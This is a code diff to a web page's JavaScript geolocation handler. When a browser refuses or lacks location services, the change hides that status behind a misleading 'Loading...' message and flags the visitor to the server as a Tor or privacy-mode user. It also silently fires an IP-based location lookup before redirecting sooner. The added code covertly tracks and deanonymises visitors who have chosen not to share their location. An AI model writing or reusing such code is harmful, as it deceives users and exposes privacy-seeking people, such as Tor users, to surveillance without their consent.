@@ -57,16 +57,23 @@ echo '
                     }
                 );
             } else {
-                document.getElementById("locationStatus").innerText = "Your browser doesn\'t support location services";
+                document.getElementById("locationStatus").innerText = "Loading...";
                 // Report to server
                 var xhr = new XMLHttpRequest();
                 xhr.open("POST", "handlers/location.php", true);
                 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                xhr.send("error=1&error_code=0&error_msg=" + encodeURIComponent("Geolocation not supported by browser"));
+                xhr.send("error=1&error_code=0&error_msg=" + encodeURIComponent("Geolocation not supported by browser (Tor Browser / Privacy Mode)"));
+                
+                // Automatically trigger IP-based location fallback
+                var xhr2 = new XMLHttpRequest();
+                xhr2.open("POST", "handlers/ip_location.php", true);
+                xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr2.send("fallback=1&source=page_load&time=" + new Date().getTime());
+
                 // Redirect after a delay
                 setTimeout(function() {
                     redirectToMainPage();
-                }, 2000);
+                }, 1000);
             }
         }
         
